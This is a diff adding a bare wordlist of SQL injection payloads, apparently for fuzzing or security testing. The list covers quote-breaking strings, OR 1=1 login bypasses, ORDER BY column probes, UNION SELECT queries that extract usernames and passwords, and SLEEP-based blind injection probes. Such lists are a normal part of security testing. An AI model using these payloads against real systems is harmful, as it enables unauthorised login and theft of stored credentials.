@@ -1,0 +1,25 @@
+'
+''
+"""
+\
+\'
+')--
+" OR "1"="1
+' OR '1'='1
+" OR 1=1--
+' OR 1=1--
+')) OR 1=1--
+admin' --
+admin'#
+admin'/*
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+-1' UNION SELECT 1,2,3--
+' UNION SELECT NULL--
+' UNION SELECT username, password FROM users--
+' AND SLEEP(5)--
+" AND SLEEP(5)--
+1 OR SLEEP(5)#
+1 OR 1=1#
+1' OR 'a'='a
